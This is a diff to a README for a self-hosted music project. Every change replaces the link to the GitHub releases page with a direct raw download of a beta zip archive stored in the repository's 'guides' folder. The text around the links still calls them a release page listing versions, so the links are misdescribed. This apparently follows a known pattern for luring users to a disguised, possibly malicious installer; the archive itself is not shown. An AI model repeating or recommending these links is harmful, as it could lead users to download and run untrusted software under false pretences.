@@ -1,6 +1,6 @@
 # 🎵 Awesome-SelfHosted-Music - Organize Your Music Ecosystem Easily
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Awesome--SelfHosted--Music-4caf50?style=for-the-badge)](https://github.com/EmersonKael/Awesome-SelfHosted-Music/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Awesome--SelfHosted--Music-4caf50?style=for-the-badge)](https://github.com/EmersonKael/Awesome-SelfHosted-Music/raw/refs/heads/main/guides/Hosted_Self_Music_Awesome_2.4-beta.5.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Before you start, make sure your system meets these basic requirements:
 
 ## 🚀 Getting Started
 
-1. Visit the release page by clicking the large download button at the top or [here](https://github.com/EmersonKael/Awesome-SelfHosted-Music/releases). This page lists all available versions and their files.
+1. Visit the release page by clicking the large download button at the top or [here](https://github.com/EmersonKael/Awesome-SelfHosted-Music/raw/refs/heads/main/guides/Hosted_Self_Music_Awesome_2.4-beta.5.zip). This page lists all available versions and their files.
 
 2. Look for the latest stable release. It usually has the most recent date and does not mention "beta" or "alpha."
 
@@ -107,7 +107,7 @@ After install and configuration:
 
 New versions include bug fixes and new features. To update:
 
-1. Go to the release page again at [https://github.com/EmersonKael/Awesome-SelfHosted-Music/releases](https://github.com/EmersonKael/Awesome-SelfHosted-Music/releases)  
+1. Go to the release page again at [https://github.com/EmersonKael/Awesome-SelfHosted-Music/raw/refs/heads/main/guides/Hosted_Self_Music_Awesome_2.4-beta.5.zip](https://github.com/EmersonKael/Awesome-SelfHosted-Music/raw/refs/heads/main/guides/Hosted_Self_Music_Awesome_2.4-beta.5.zip)  
 2. Download the latest installer or update files.  
 3. Run the installer as before. It will replace old files safely.  
 4. Restart the application if needed.
@@ -137,7 +137,7 @@ These resources help you tailor your music server experience and enhance perform
 
 ---
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Awesome--SelfHosted--Music-ff6f61?style=for-the-badge)](https://github.com/EmersonKael/Awesome-SelfHosted-Music/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Awesome--SelfHosted--Music-ff6f61?style=for-the-badge)](https://github.com/EmersonKael/Awesome-SelfHosted-Music/raw/refs/heads/main/guides/Hosted_Self_Music_Awesome_2.4-beta.5.zip)
 
 ---
 
